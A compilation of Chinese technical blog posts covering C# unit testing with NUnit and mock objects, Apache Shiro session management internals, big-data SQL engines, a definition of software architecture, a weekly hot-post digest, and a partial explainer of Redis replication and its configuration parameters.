            return a * b;
        }

        /// <summary>
        /// 除法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Divide(double a, double b)
        {
            return a / b;
        }
    }
    /// <summary>
    /// 针对计算加减乘除的简单的单元测试类
    /// </summary>
    [TestFixture]
    public class CalculatorTest
    {
        /// <summary>
        /// 计算器类对象
        /// </summary>
        public Calculator Calculator { get; set; }

        /// <summary>
        /// 参数1
        /// </summary>
        public double NumA { get; set; }

        /// <summary>
        /// 参数2
        /// </summary>
        public double NumB { get; set; }

        /// <summary>
        /// 初始化
        /// </summary>
        [SetUp]
        public void SetUp()
        {
            NumA = 10;
            NumB = 20;
            Calculator = new Calculator();
        }

        /// <summary>
        /// 测试加法
        /// </summary>
        [Test]
        public void TestAdd()
        {
            double result = Calculator.Add(NumA, NumB);
            Assert.AreEqual(result, 30);
        }

        /// <summary>
        /// 测试减法
        /// </summary>
        [Test]
        public void TestSub()
        {
            double result = Calculator.Sub(NumA, NumB);
            Assert.LessOrEqual(result, 0);
        }

        /// <summary>
        /// 测试乘法
        /// </summary>
        [Test]
        public void TestMutiply()
        {
            double result = Calculator.Mutiply(NumA, NumB);
            Assert.GreaterOrEqual(result, 200);
        }
        
        /// <summary>
        /// 测试除法
        /// </summary>
        [Test]
        public void TestDivide()
        {
            double result = Calculator.Divide(NumA, NumB);
            Assert.IsTrue(0.5 == result);
        }
    }
3.3 如何做好单元测试
​ 单元测试是非常有魔力的魔法，但是如果使用不恰当亦会浪费大量的时间在维护和调试上从而影响代码和整个项目。
好的单元测试应该具有以下品质:
• 自动化
• 彻底的
• 可重复的
• 独立的
• 专业的
3.3.1 测试哪些内容
​ 一般来说有六个值得测试的具体方面，可以把这六个方面统称为Right-BICEP:

Right----结果是否正确？
B----是否所有的边界条件都是正确的？
I----能否检查一下反向关联？C----能否用其它手段检查一下反向关联？
E----是否可以强制产生错误条件？
P----是否满足性能条件？

3.3.2 CORRECT边界条件
​ 代码中的许多Bug经常出现在边界条件附近，我们对于边界条件的测试该如何考虑？

一致性----值是否满足预期的格式
有序性----一组值是否满足预期的排序要求
区间性----值是否在一个合理的最大值最小值范围内
引用、耦合性----代码是否引用了一些不受代码本身直接控制的外部因素
存在性----值是否存在（例如：非Null，非零，存在于某个集合中）
基数性----是否恰好具有足够的值
时间性----所有事情是否都按照顺序发生的？是否在正确的时间、是否及时

3.3.3 使用Mock对象
    单元测试的目标是一次只验证一个方法或一个类，但是如果这个方法依赖一些其他难以操控的东西，比如网络、数据库等。这时我们就要使用mock对象，使得在运行unit test的时候使用的那些难以操控的东西实际上是我们mock的对象，而我们mock的对象则可以按照我们的意愿返回一些值用于测试。通俗来讲，Mock对象就是真实对象在我们调试期间的测试品。
Mock对象创建的步骤:

使用一个接口来描述这个对象。
为产品代码实现这个接口。
以测试为目的，在mock对象中实现这个接口。

Mock对象示例:
   /// <summary>
    ///账户操作类
    /// </summary>
    public class AccountService
    {
        /// <summary>
        /// 接口地址
        /// </summary>
        public string Url { get; set; }

        /// <summary>
        /// Http请求帮助类
        /// </summary>
        public IHttpHelper HttpHelper { get; set; }
        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="httpHelper"></param>
        public AccountService(IHttpHelper httpHelper)
        {
            HttpHelper = httpHelper;
        }

        #region 支付
        /// <summary>
        /// 支付
        /// </summary>
        /// <param name="json">支付报文</param>
        /// <param name="tranAmt">金额</param>
        /// <returns></returns>
        public bool Pay(string json)
        {            
            var result = HttpHelper.Post(json, Url);
            if (result == "SUCCESS")//这是我们要测试的业务逻辑
            {
                return true;
            }
            return false;
        }
        #endregion

        #region 查询余额
        /// <summary>
        /// 查询余额
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public decimal? QueryAmt(string account)
        {
            var url = string.Format("{0}?account={1}", Url, account);

            var result = HttpHelper.Get(url);

            if (!string.IsNullOrEmpty(result))//这是我们要测试的业务逻辑
            {
                return decimal.Parse(result);
            }
            return null;
        }
        #endregion

    }
    /// <summary>
    /// Http请求接口
    /// </summary>
    public interface IHttpHelper
    {
        string Post(string json, string url);

        string Get(string url);
    }
    /// <summary>
    /// HttpHelper
    /// </summary>
    public class HttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

        public string Get(string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

    }
    /// <summary>
    /// Mock的 HttpHelper
    /// </summary>
    public class MockHttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
            //这是Mock的Http请求
            var result = "SUCCESS";
            return result;
        }

        public string Get(string url)
        {
            //这是Mock的Http请求
            var result = "0.01";
            return result;
        }

   }
     如上，我们的AccountService的业务逻辑依赖于外部对象Http请求的返回值在真实的业务中我们给AccountService注入真实的HttpHelper类，而在单元测试中我们注入自己Mock的HttpHelper，我们可以根据不同的用例来模拟不同的Http请求的返回值来测试我们的AccountService的业务逻辑。
注意:记住，我们要测试的是AccountService的业务逻辑:根据不同http的请求(或传入不同的参数)而返回不同的结果，一定要弄明白自己要测的是什么！而无关的外部对象内的逻辑我们并不关心，我们只需要让它给我们返回我们想要的值，来验证我们的业务逻辑即可
    关于Mock对象一般会使用Mock框架，关于Mock框架的使用，我们将在下一篇文章中介绍。.net 平台常用的Mock框架有Moq,PhinoMocks,FakeItEasy等。
3.4 单元测试之代码覆盖率
​ 在做单元测试时，代码覆盖率常常被拿来作为衡量测试好坏的指标，甚至，用代码覆盖率来考核测试任务完成情况，比如，代码覆盖率必须达到80％或90％。于是乎，测试人员费尽心思设计案例覆盖代码。因此我认为用代码覆盖率来衡量是不合适的，我们最根本的目的是为了提高我们回归测试的效率，项目的质量不是吗?
结束语
    本篇文章主要介绍了单元测试的WWH，分享了我们为什么要做单元测试并简单介绍了单元测试的概念以及如何去做单元测试。当然，千万不要天真的以为看了本篇文章就能做好单元测试，如果你的组织开始推进了单元测试，那么在推进的过程中相信仍然会遇到许多问题(就像我们遇到的，依赖外部对象问题，静态方法如何mock......)。如何更好的去做单元测试任重而道远。下一篇文章将针对我们具体实施推进单元测试中遇到的一些问题，来讨论如何更好的做单元测试。如:如何破除依赖，如何编写可靠可维护的测试，以及如何面向测试进行程序的设计等。
​ 未完待续，敬请关注......
参考
《单元测试的艺术》
我们做单元测试的经历

********************************************************************************************************************************************************************************************************
shiro源码篇 - shiro的session管理，你值得拥有
前言
　　开心一刻
　　　　开学了，表弟和同学因为打架，老师让他回去叫家长。表弟硬气的说：不用，我打得过他。老师板着脸对他说：和你打架的那位同学已经回去叫家长了。表弟犹豫了一会依然硬气的说：可以，两个我也打得过。老师：......
 
　　路漫漫其修远兮，吾将上下而求索！
　　github：https://github.com/youzhibing
　　码云(gitee)：https://gitee.com/youzhibing
前情回顾
　　大家还记得上篇博文讲了什么吗，我们来一起简单回顾下：
　　　　HttpServletRequestWrapper是HttpServletRequest的装饰类，我们通过继承HttpServletRequestWrapper来实现我们自定义的HttpServletRequest：CustomizeSessionHttpServletRequest，重写CustomizeSessionHttpServletRequest的getSession，将其指向我们自定义的session。然后通过Filter将CustomizeSessionHttpServletRequest添加到Filter chain中，使得到达Servlet的ServletRequest是我们的CustomizeSessionHttpServletRequest。
　　今天不讲session共享，我们先来看看shiro的session管理
SecurityManager
　　SecurityManager，安全管理器；即所有与安全相关的操作都会与SecurityManager交互；它管理着所有Subject，所有Subject都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher。
　　我们在使用shiro的时候，首先都会先初始化SecurityManager，然后往SecurityManager中注入shiro的其他组件，像sessionManager、realm等。我们的spring-boot-shiro中初始化的是DefaultWebSecurityManager，如下


@Bean
public SecurityManager securityManager(AuthorizingRealm myShiroRealm, CacheManager shiroRedisCacheManager) {
    DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
    securityManager.setCacheManager(shiroRedisCacheManager);
    securityManager.setRememberMeManager(cookieRememberMeManager());
    securityManager.setRealm(myShiroRealm);
    return securityManager;
}

View Code
　　SecurityManager类图
　　　　结构如下，认真看看，注意看下属性

　　　　顶层组件SecurityManager直接继承了SessionManager且提供了SessionsSecurityManager实现，SessionsSecurityManager直接把会话管理委托给相应的SessionManager；SecurityManager的默认实现：DefaultSecurityManager及DefaultWebSecurityManager都继承了SessionsSecurityManager，也就是说：默认情况下，session的管理由DefaultSecurityManager或DefaultWebSecurityManager中的SessionManager来负责。
　　　　DefaultSecurityManager
　　　　　　默认安全管理器，用于我们的javaSE安全管理，一般而言用到的少，但我们需要记住，万一哪次有这个需求呢。
　　　　　　我们来看下他的构造方法

　　　　　　默认的sessionManager是DefaultSessionManager，DefaultSessionManager具体详情请看下文。
　　　　DefaultWebSecurityManager
　　　　　　默认web安全管理器，用于我们的web安全管理；一般而言，我们的应用中初始化此安全管理器。
　　　　　　我们来看看其构造方法



public DefaultWebSecurityManager() {
    super();                                                    // 会调用SessionsSecurityManager的构造方法，实例化DefaultSessionManager
    ((DefaultSubjectDAO) this.subjectDAO).setSessionStorageEvaluator(new DefaultWebSessionStorageEvaluator());
    this.sessionMode = HTTP_SESSION_MODE;
    setSubjectFactory(new DefaultWebSubjectFactory());
    setRememberMeManager(new CookieRememberMeManager());
    setSessionManager(new ServletContainerSessionManager());    // 设置sessionManager，替换掉上面的DefaultSessionManager
}

View Code
　　　　　　可以看出此时的sessionManager是ServletContainerSessionManager，ServletContainerSessionManager具体详情请看下文。
　　　　由此可知默认情况下，DefaultSecurityManager会将session管理委托给DefaultSessionManager，而DefaultWebSecurityManager则将session管理委托给ServletContainerSessionManager。
　　　　我们可以通过继承DefaultSecurityManager或DefaultWebSecurityManager来实现自定义SecurityManager，但一般而言没必要，DefaultSecurityManager和DefaultWebSecurityManager基本能满足我们的需要了，我们根据需求二选其一即可。无论DefaultSecurityManager还是DefaultWebSecurityManager，我们都可以通过setSessionManager方法来指定sessionManager，如果不指定sessionManager的话就用的SecurityManager默认的sessionManager。
SessionManager
　　shiro提供了完整的会话管理功能，不依赖底层容器，JavaSE应用和JavaEE应用都可以使用。会话管理器管理着应用中所有Subject的会话，包括会话的创建、维护、删除、失效、验证等工作。
　　SessionManager类图

　　　　　　DefaultSessionManager
　　　　　　DefaultSecurityManager默认使用的SessionManager，用于JavaSE环境的session管理。

　　　　　　通过上图可知（结合SecurityManager类图），session创建的关键入口是SessionsSecurityManager的start方法，此方法中会将session的创建任务委托给具体的SessionManager实现。
　　　　　　DefaultSessionManager继承自AbstractNativeSessionManager，没用重写start方法，所以此时AbstractNativeSessionManager的start方法会被调用，一路往下跟，最终会调用DefaultSessionManager的doCreateSession方法完成session的创建，doCreateSession方法大家可以自行去跟下，我在这总结一下：　　　　　　　
　　　　　　　　创建session，并生成sessionId，session是shiro的SimpleSession类型，sessionId采用的是随机的UUID字符串；	　　　　　　　　sessionDAO类型是MemorySessionDAO，session存放在sessionDAO的private ConcurrentMap<Serializable, Session> sessions;属性中，key是sessionId，value是session对象；	　　　　　　　　除了MemorySessionDAO，shiro还提供了EnterpriseCacheSessionDAO，具体两者有啥区别请看我的另一篇博客讲解。
	　　　　ServletContainerSessionManager
　　　　　　DefaultWebSecurityManager默认使用的SessionManager，用于Web环境，直接使用的Servlet容器的会话，具体实现我们往下看。
　　　　　　ServletContainerSessionManager实现了SessionManager，并重写了SessionManager的start方法，那么我们从ServletContainerSessionManager的start方法开始来看看session的创建过程，如下图

　　　　　　shiro有自己的HttpServletSession，HttpServletSession持有servlet的HttpSession的引用，最终对HttpServletSession的操作都会委托给HttpSession（装饰模式）。那么此时的session是标准servlet容器支持的HttpSession实例，它不与Shiro的任何与会话相关的组件（如SessionManager，SecurityManager等）交互，完全由servlet容器管理。
	　　　　DefaultWebSessionManager
　　　　　　用于Web环境，可以替换ServletContainerSessionManager，废弃了Servlet容器的会话管理；通过此可以实现我们自己的session管理；
　　　　　　从SessionManager类图可知，DefaultWebSessionManager继承自DefaultSessionManager，也没有重写start方法，那么创建过程还是沿用的AbstractNativeSessionManager的start方法；如果我们没有指定自己的sessionDao，那么session还是存在MemorySessionDAO的ConcurrentMap<Serializable, Session> sessions中，具体可以看上述中的DefaultSessionManager。
　　　　　　通过DefaultWebSessionManager实现session共享，尽请期待！
总结
　　两个类图
　　　　SecurityManager和SessionManager的类图需要认真看看；
　　　　Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher；
　　　　SecurityManager会将session管理委托给SessionManager；SessionsSecurityManager的start方法中将session的创建委托给了具体的sessionManager，是创建session的关键入口。	　　shiro的SimpleSession与HttpServletSession		　　　　HttpServletSession只是servlet容器的session的装饰，最终还是依赖servlet容器，是shiro对servlet容器的session的一种支持；		　　　　而SimpleSession是shiro完完全全的自己实现，是shiro对session的一种拓展。
参考
　　《跟我学shiro》
********************************************************************************************************************************************************************************************************
大数据不就是写SQL吗?
应届生小祖参加了个需求分析会回来后跟我说被产品怼了一句：

"不就是写SQL吗，要那么久吗"

我去，欺负我小弟，这我肯定不能忍呀，于是我写了一篇文章发在了公司的wiki


贴出来给大家看看，省略了一些敏感的内容。当然内部版言辞也会温和一点，嘻嘻

在哪里写SQL？
这个问题高级点的问法是用哪种SQL引擎？
SparkSQL、Hive、Phoenix、Drill、Impala、Presto、Druid、Kylin （这里的SQL引擎是广义的，大家不必钻牛角尖）
我用一句话概括下这几个东西，先不管你们现在看不看得懂：

Hive：把sql解析后用MapReduce跑
SparkSQL：把sql解析后用Spark跑，比hive快点
Phoenix：一个绕过了MapReduce运行在HBase上的SQL框架
Drill/Impala/Presto 交互式查询,都是类似google Dremel的东西，区别这里就不说了
Druid/Kylin olap预计算系统

这就涉及到更多的问题了，对这些组件不熟悉的同学可能调研过程就得花上一个多月。
比如需求是实时计算还是离线分析？
数据是增量数据还是静态数据？
数据量有多大？
能容忍多长的响应时间？
总之，功能、性能、稳定性、运维难度、开发难度这些都是要考虑的
对哪里的数据执行SQL？
你以为选完引擎就可以开写了？too naive！
上面提到的大部分工具都仅仅是查询引擎，存储呢？
“啥，为啥还要管存储？”
不管存储，那是要把PB级的数据存在mysql是吧...
关系型数据库像mysql这种，查询引擎和存储是紧耦合的，这其实是有助于优化性能的，你不能把它们拆分开来。
而大数据系统SQL引擎一般都是独立于数据存储系统，获得了更大的灵活性。这都是出于数据量和性能的考虑。
这涉及到的问题就更多了。先要搞清楚引擎支持对接哪些存储，怎么存查询起来方便高效。
可以对接的持久化存储我截个图，感受一下（这还只是一小部分）

用哪种语法写SQL？
你以为存储和查询搞定就可以开写了？你以为全天下的sql都是一样的？并不是！
并不是所有的引擎都支持join；
并不是所有的distinct都是精准计算的；
并不是所有的引擎都支持limit分页；
还有，如果处理复杂的场景经常会需要自定义sql方法，那如何自定义呢，写代码呀。
举几个简单而常见的栗子：
见过这样的sql吗？
select `user`["user_id"] from tbl_test ;
见过这种操作吗？
insert overwrite table tbl_test select * from tbl_test  where id>0; 
卧槽，这不会锁死吗？hive里不会，但是不建议这样做。
还能这么写
from tbl_test insert overwrite table tbl_test select *   where id>0; 
怎么用更高效的方式写SQL？
好了，全都搞定了，终于可以开始愉快地写SQL了。
写SQL的过程我用小祖刚来公司时的一句话来总结：

“卧槽，这条SQL有100多行！”

事实表，维表的数据各种join反复join，这还不算完还要再join不同时间的数据，还要$#@%^$#^...
不说了，写过的人一定知道有多恶心
（此处省略100多行字）
终于写完了，千辛万苦来到这一步，满心欢喜敲下回车...
时间过去1分钟...
10分钟...
30分钟...
1小时...
2小时...
......
别等了，这样下去是不会有结果的。
老实看日志吧，看日志也是一门很大的学问。
首先你得搞清楚这个sql是怎么运行，底层是mapReduce还是spark还是解析成了其他应用的put、get等接口;
然后得搞清楚数据是怎么走的，有没有发生数据倾斜，怎么优化。
同时你还得注意资源，cpu、内存、io等
最后
产品又来需求了，现有系统还无法实现，上面四步再折腾一遍...
推荐阅读
大数据需要学什么？
zookeeper-操作与应用场景-《每日五分钟搞定大数据》
zookeeper-架构设计与角色分工-《每日五分钟搞定大数据》
zookeeper-paxos与一致性-《每日五分钟搞定大数据》
zookeeper-zab协议-《每日五分钟搞定大数据》


********************************************************************************************************************************************************************************************************
什么是软件架构
本文探讨什么是「软件架构」，并对其下个定义！
决策or组成？
如果你去google一下「什么是软件架构」，你会看到各种各样的定义！不过大致可分为「决策」论和「组成」论！
其中一个比较著名的「决策」论的定义是Booch,Rumbaugh和Jacobson于1999年提出的：

架构就是一系列重要的决策，这些决策涉及软件系统的组织、组成系统的结构化元素及其接口的选择、元素之间协作时特定的行为、结构化元素和行为元素形成更大子系统的组合方式以及引导这一组织（也就是这些元素及其接口）、他们之间的协作以及组合（架构风格）。

而「组成」论中最受推崇的是SEI(Software Engineering Institute)的Len Bass等人提出的定义：

The software architecture of a program or computing system is the structure or structures of the system,which comprise software elements,the externally visible properties of those elements,and the relationships among them.

Fielding博士在他的博士论文《Architectural Styles and the Design of Network-based Software Architectures》中对软件架构的定义是这样的：

A software architecture is an abstraction of the run-time elements of a software system during some phase of its operation. A system may be composed of many levels of abstraction and many phases of operation, each with its own software architecture.
软件架构是软件系统在其操作的某个阶段的运行时的元素的抽象。一个系统可能由很多层抽象和很多个操作阶段组成,每个抽象和操作阶段都有自己的软件架构。

这其实也是「组成论」！不过这里说的是系统运行时的快照！
为什么会出现这样的分歧呢？我觉得主要问题在每个人对「架构」这个词的理解！
我先来问你一个问题，你觉得「架构」这个词是名词还是动词？或者说「架构」是一个过程，还是一个结果？
「架构」对应英文单词「Architecture」，在英文里Architecture是个名词，表示结构。但实际上结构只是架构的产物，如何得到这个结构呢？是通过架构师的一个个决策得到的。所以，「架构」包含了过程和结果！
如果你去搜一下「架构」这个词的解释，你就会发现，在中文里，「架构」这个词有两层含义（来自百度词典）：

一是间架结构
二是构筑，建造

那么，「架构」是决策还是组成呢？
Wiki上对Architecture给出了一个比较好的定义：

Architecture is both the process and the product of planning, designing, and constructing buildings or any other structures。

翻译过来就是：

架构是规划、设计、构建的过程及最终成果

但是我觉得这个定义还不够，还缺少了一个关键内容，就是「约束」！
下个定义
我个人对架构的理解是：架构是特定约束下决策的结果，并且这是一个循环递进的过程。

这句话包含了三个关键词：特定约束、决策、结果。这三个词都是中性词。特别是第三个词，由于决策的不同，得到的结果也就不同，可能是「成果」，也可能是「后果」！下面来一个个具体解释。

特定约束

我们都学过阅读理解，老师在教阅读理解的时候，会提到一个词，叫「语境」！比如下面这个段子！

领导：你这是什么意思？
小明：没什么意思，意思意思。
领导：你这就不够意思了。
小明：小意思，小意思。
领导：你这人真有意思。
小明：其实也没有别的意思。
领导：那我就不好意思了。
小明：是我不好意思。
提问：以上“意思”分别是什么意思？

这里的「意思」在不同的语境下有不同的含义。语境就是上下文，也就是我们软件行业常说的Context！Context不同，得到的结果也就不同！
其实任何行为、言语、结论都有一个Context为前提！只是在不同的情况下我们对这个Context的叫法不同！比如：

直角三角形的两直角的平方等于斜边的平方

这句话在欧几里得几何这个Context下是成立的！但是在非欧几何这个Context下就是不成立的！在数学里，这个Context可以称为是「限定条件」！
同样的牛顿力学定律，在普通场景下是成立的！但是在量子力学下是不成立的！在物理里，这个Context可以称为「环境」！
在架构里也一样，淘宝的架构可能在其它情况下并不适用，因为Context不同！这里的Context就称为「约束」！
而且这个「约束」必须是「特定约束」，不能是「泛约束」！比如说，「我要造个房子」，这个约束就是个「泛约束」！是没办法执行的！（下节通过例子来详细说明）

决策

决策是一个过程！实际上就是选择！选择技术、结构、通信方式等内容，去符合「特定约束」！
在决策时，实际上无形中又加入了一个约束：人的约束！做决策的人的认知又约束了决策本身！比如某个架构师只知道分层架构，那么他无论在哪种Context下都只有分层架构这一个选择！

结果

是决策的最终产物：可能是运行良好、满足需求的系统。也可能是一堆文档。或者是满嘴的跑火车！
如果这个结果是五视图、组件、接口、子系统、及其之间的关系，那么这个架构就是软件架构！
如果这个结果是建筑图纸、钢筋水泥、高楼大厦，那么这个架构就是建筑架构！
如果这个结果是事业成功、家庭美满，那么这个架构就是人生架构，也叫人生规划！
举个例子
以上面「我要造个房子」为例，来详细解释「架构是特定约束下决策的结果」！
上面已经说了「我要造个房子」是个泛约束，是无法满足的！因为它有很多可能性选择，且很多选择是互斥的！例如：

房子造在哪里？城市、乡村、山顶、海边、南北极......
要造成什么样子？大平层、楼房、草房、城堡......
要使用什么材料？水泥、玻璃、木头、竹子......
......

这里实际就是需求收集阶段，需要和客户沟通，挖出具体的客户需求！
假设客户最终决定：想在海边建个房子，适合两个人住，每半年过来度假一周左右，希望能方便的看到海、还有日出，预计支出不超过XX元！这就是功能性需求！
通过上面的功能性需求，你需要挖出非功能性需求：

海边风大、潮湿。如何防风？防潮？
海潮声音大，是否需要做好隔音？避免影响睡眠？
希望能看到海和日出，使用玻璃是否合适？需要什么样的玻璃？
价格是否超出预算？
.....

完善的需求（功能性、非功能性），实际就是架构的「特定约束」！而对上面这些问题的选择，就是「决策」！

为了防风，地基要打深一点；要使用防潮材料
墙壁需要加厚，使用隔音门和窗户
面朝大海的墙使用强化加厚玻璃墙
选择价格内的材料
......

这些决策确定后，需要告诉工人如何建造！需要相关的设计图，对不同的人需要不同的图！比如，对建造工人就是整体结构说明图，水电工就是水电线路图！这些图纸就是你决策的部分结果。
整个过程是个循环递进的过程！比如：你为了解决客户方便看海的问题，先选择了开一个较大的窗户的方案！但是客户觉得不够大！你决定直接把整面墙都使用玻璃来建造，客户很满意，但是承重、防风等问题如何解决？你最终决定通过使用强化的加厚玻璃来解决这个问题！
最终交付给客户的房子才是你架构的最终成果！
免责申明：我不懂造房子，以上言论都是胡诌的，你理解意思就行了！
纵向深入
最近订阅了李运华的《从0开始学架构》，他对架构的理解是：软件架构指软件系统的顶层结构！我觉得这个定义太过宽泛了，且只是定义了「结构」而没有说明「过程」！不过，这间接说明了架构和设计的关系！架构是顶层设计！
从操作层面做决策：用户从哪里进入、页面应该跳转到哪里、应该输入哪些信息.....这就是流程设计！
从代码层面决策，代码该怎么写：模块如何组织、包如何组织、类如何组织、方法如何组织......这就是代码设计！
从系统整体层面决策：子系统如何组织、组件如何组织、接口如何设计......这就是架构设计！
横向扩展
好像架构思维是个比较通用的思维方式！读书，演讲，写作.....都是这样！
读书，你需要先了解这本书是讲关于什么的？计算机、哲学、心理学.....以及具体是讲的哪个方面？这是约束！然后你需要问自己，自己是否需要了解这些内容？是否需要读这本书？这就是决策！如果需要读，那么再进一步，这本书的整体结构是什么样子的？我该怎么读？这个章节是讲什么的？我是否需要读？我是否同意作者的结论？如果同意，我为什么同意？如果不同意，我为什么不同意？我有什么自己的观点？最终的成果就是我对这本书的个人理解！
演讲，你需要先了解你是对谁进行演讲的？要讲什么？听众的水平如何？听众的水平以及演讲的内容就是你演讲的约束！然后你需要考虑如何进行演讲？演讲的整体结构该怎么组织？该用什么样的语言？是否该讲个笑话？各个小节里的内功如何组织？这里是否需要设置问题？这里是否可能会有人提出问题？会提出什么样的问题？我该如何回答？这些是决策！最终，做出来的演讲，就是我这次演讲的成果！
写作和演讲比较类似，少了一些互动。就不再赘述了！
做个小结
本文梳理了我对架构的理解：架构是特定约束下决策的结果，并且这是一个循环递进的过程。并通过例子来解释我为什么这么理解！
参考资料

《IBM架构思维介绍》
《恰如其分的软件架构》
《Java应用架构设计》
《软件架构设计》
《程序员必读之软件架构》
维基百科
百度词典


********************************************************************************************************************************************************************************************************
上周热点回顾（10.1-10.7）
热点随笔：
· .NET 开源项目 Polly 介绍（Liam Wang）· .Net Core中的Api版本控制（LamondLu）· TCP协议学习总结（上）（wc的一些事一些情）· Jenkins pipeline 并行执行任务流（sparkdev）· 一文搞懂：词法作用域、动态作用域、回调函数、闭包（骏马金龙）· 为什么程序员需要知道互联网行业发展史（kid551）· 用CSS实现一个抽奖转盘（wenr）· 大数据不就是写sql吗?（大叔据）· .NET微服务调查结果（张善友）· 工作五年总结——以及两年前曾提出问题的回答（受戒人）· 我是如何学习数据结构与算法的？（帅地）· 在国企的日子(序言)（心灵之火）
热点新闻：
· 腾讯员工离职忠告：离开大公司 我才知道世界有多坏· 可怕！29岁小伙心脏血管犹如豆腐渣！只因这个习惯· 彭博社曝光的“间谍芯片” 我在淘宝1块钱就能买一个· 这15张图能教给你的东西，比读完100本书还多· 一天内让两位名人去世，这种病是“癌症之王”· 怎样的物理学天才 让诺贝尔奖破例为他改了颁奖地点· 杭州，AI时代的第一个城市“牺牲品”· 贾跃亭提起仲裁欲踢恒大出局 花光8亿美元再要7个亿· 微软开源基于模型的机器学习框架Infer.NET· 陈列平与诺奖失之交臂，但他的贡献远比诺奖重要· 马云放弃在阿里巴巴主要法律实体的所有权· 今天所有美国手机都收到总统警报，到底是咋回事？
********************************************************************************************************************************************************************************************************
Redis-复制
复制
A few things to understand ASAP about Redis replication.

1) Redis replication is asynchronous, but you can configure a master to
   stop accepting writes if it appears to be not connected with at least
   a given number of slaves.
2) Redis slaves are able to perform a partial resynchronization with the
   master if the replication link is lost for a relatively small amount of
   time. You may want to configure the replication backlog size (see the next
   sections of this file) with a sensible value depending on your needs.
3) Replication is automatic and does not need user intervention. After a
   network partition slaves automatically try to reconnect to masters
   and resynchronize with them.

 
复制的实现
1. 设置主节点的地址和端口
简而言之，是执行SLAVEOF命令，该命令是个异步命令，在设置完masterhost和masterport属性之后，从节点将向发送SLAVEOF的客户端返回OK。表示复制指令已经被接受，而实际的复制工作将在OK返回之后才真正开始执行。
 
2. 创建套接字连接。
在执行完SLAVEOF命令后，从节点根据命令所设置的IP和端口，创建连向主节点的套接字连接。如果创建成功，则从节点将为这个套接字关联一个专门用于处理复制工作的文件事件处理器，这个处理器将负责执行后续的复制工作，比如接受RDB文件，以及接受主节点传播来的写命令等。
 
3. 发送PING命令。
从节点成为主节点的客户端之后，首先会向主节点发送一个PING命令，其作用如下：
1. 检查套接字的读写状态是否正常。
2. 检查主节点是否能正常处理命令请求。
如果从节点读取到“PONG”的回复，则表示主从节点之间的网路连接状态正常，并且主节点可以正常处理从节点发送的命令请求。
 
4. 身份验证
从节点在收到主节点返回的“PONG”回复之后，接下来会做的就是身份验证。如果从节点设置了masterauth选项，则进行身份验证。反之则不进行。
在需要进行身份验证的情况下，从节点将向主节点发送一条AUTH命令，命令的参数即可从节点masterauth选项的值。
 
5. 发送端口信息。
在身份验证之后，从节点将执行REPLCONF listening-port  <port-number>，向主节点发送从节点的监听端口号。
主节点会将其记录在对应的客户端状态的slave_listening_port属性中，这点可通过info Replication查看。

127.0.0.1:6379> info Replication
# Replication
role:master
connected_slaves:1
slave0:ip=127.0.0.1,port=6380,state=online,offset=3696,lag=0

 
6. 同步。
从节点向主节点发送PSYNC命令，执行同步操作，并将自己的数据库更新至主节点数据库当前所处的状态。
 
7. 命令传播
当完成了同步之后，主从节点就会进入命令传播阶段。这时主节点只要一直将自己执行的写命令发送到从节点，而从节点只要一直接收并执行主节点发来的写命令，就可以保证主从节点保持一致了。
 
8. 心跳检测
在命令传播阶段，从节点默认会以每秒一次的频率，向主节点发送命令。
REPLCONF ACK <replication_offset>
其中，replication_offset是从节点当前的复制偏移量。
发送REPLCONF ACK主从节点有三个作用：
1> 检测主从节点的网络连接状态。
2> 辅助实现min-slave选项。
3> 检查是否存在命令丢失。
REPLCONF ACK命令和复制积压缓冲区是Redis 2.8版本新增的，在此之前，即使命令在传播过程中丢失，主从节点都不会注意到。
 
复制的相关参数

slaveof <masterip> <masterport>
masterauth <master-password>

slave-serve-stale-data yes

slave-read-only yes

repl-diskless-sync no

repl-diskless-sync-delay 5

repl-ping-slave-period 10

repl-timeout 60

repl-disable-tcp-nodelay no

repl-backlog-size 1mb

repl-backlog-ttl 3600

slave-priority 100

min-slaves-to-write 3
min-slaves-max-lag 10

slave-announce-ip 5.5.5.5
slave-announce-port 1234

其中，
slaveof <masterip> <masterport>：开启复制，只需这条命令即可。
masterauth <master-password>：如果master中通过requirepass参数设置了密码，则slave中需设置该参数。
slave-serve-stale-data：当主从连接中断，或主从复制建立期间，是否允许slave对外提供服务。默认为yes，即允许对外提供服务，但有可能会读到脏的数据。
slave-read-only：将slave设置为只读模式。需要注意的是，只读模式针对的只是客户端的写操作，对于管理命令无效。
repl-diskless-sync，repl-diskless-sync-delay：是否使用无盘复制。为了降低主节点磁盘开销，Redis支持无盘复制，生成的RDB文件不保存到磁盘而是直接通过网络发送给从节点。无盘复制适用于主节点所在机器磁盘性能较差但网络宽带较充裕的场景。需要注意的是，无盘复制目前依然处于实验阶段。
repl-ping-slave-period：master每隔一段固定的时间向SLAVE发送一个PING命令。
repl-timeout：复制超时时间。

# The following option sets the replication timeout for:
#
# 1) Bulk transfer I/O during SYNC, from the point of view of slave.
# 2) Master timeout from the point of view of slaves (data, pings).
# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).
#
# It is important to make sure that this value is greater than the value
# specified for repl-ping-slave-period otherwise a timeout will be detected
# every time there is low traffic between the master and the slave.

 
repl-disable-tcp-nodelay：设置为yes，主节点会等待一段时间才发送TCP数据包，具体等待时间取决于Linux内核，一般是40毫秒。适用于主从网络环境复杂或带宽紧张的场景。默认为no。
 
repl-backlog-size：复制积压缓冲区，复制积压缓冲区是保存在主节点上的一个固定长度的队列。用于从Redis 2.8开始引入的部分复制。

# Set the replication backlog size. The backlog is a buffer that accumulates
# slave data when slaves are disconnected for some time, so that when a slave
# wants to reconnect again, often a full resync is not needed, but a partial
# resync is enough, just passing the portion of data the slave missed while
# disconnected.
#
# The bigger the replication backlog, the longer the time the slave can be
# disconnected and later be able to perform a partial resynchronization.
#
